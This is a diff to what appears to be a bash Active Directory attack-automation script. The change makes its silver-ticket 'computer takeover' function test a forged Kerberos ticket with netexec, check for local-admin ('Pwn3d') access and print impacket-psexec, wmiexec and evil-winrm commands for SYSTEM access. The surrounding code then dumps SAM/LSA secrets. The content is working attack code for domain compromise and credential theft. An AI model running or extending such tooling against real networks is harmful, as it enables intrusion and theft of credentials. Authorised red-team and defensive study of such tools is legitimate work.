@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.51.1"
+readonly VERSION="1.51.2"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -4163,8 +4163,21 @@ _abuse_computer_silver() {
     done
     [[ "$won" != "1" ]] && { warn "  impacket-ticketer failed for $target"; return 1; }
     note_cred_source "${imp}@${host}" "Silver ticket (computer takeover of $target)"
-    loot "  → access ${host} AS ${imp}: KRB5CCNAME=$cc impacket-psexec -k -no-pass ${host}.${DOMAIN}  (or wmiexec / RDP)"
-    loot "    if ${imp} is local admin there → SYSTEM directly; otherwise it's interactive access → RpcEptMapper Performance-DLL → SYSTEM"
+    # VERIFY the ticket actually grants access (don't just print a command). The
+    # impersonated principal defaults to the RID-500 admin but is configurable with
+    # SILVER_IMPERSONATE=<user> (set it to a known local-admin / RDP user if the
+    # default isn't privileged on this host).
+    local vchk; vchk=$(KRB5CCNAME="$cc" $NXC smb "${host}.${DOMAIN}" -k 2>&1); printf '%s\n' "$vchk" >>"$LOGFILE"
+    if grep -qi 'Pwn3d' <<<"$vchk"; then
+        loot "★ Verified: ${C_BOLD}${imp}${C_RESET} is LOCAL ADMIN on ${host} → ${C_GREEN}psexec/wmiexec = SYSTEM${C_RESET}"
+        loot "  → KRB5CCNAME=$cc impacket-psexec -k -no-pass ${host}.${DOMAIN}"
+    elif grep -qiE '\[\+\]' <<<"$vchk"; then
+        loot "★ Verified: ticket authenticates to ${host} as ${imp} (not local admin → interactive/RDP access → RpcEptMapper → SYSTEM)"
+        loot "  → KRB5CCNAME=$cc evil-winrm/RDP to ${host}.${DOMAIN}"
+    else
+        warn "  ticket forged but access as '${imp}' to ${host} not confirmed → retry with ${C_BOLD}SILVER_IMPERSONATE=<a local-admin/RDP user>${C_RESET}"
+        loot "  → KRB5CCNAME=$cc impacket-psexec -k -no-pass ${host}.${DOMAIN}  (or set SILVER_IMPERSONATE and re-run)"
+    fi
 
     # Convert it now: dump the host's local secrets (SAM/LSA) via the ticket.
     if have impacket-secretsdump; then
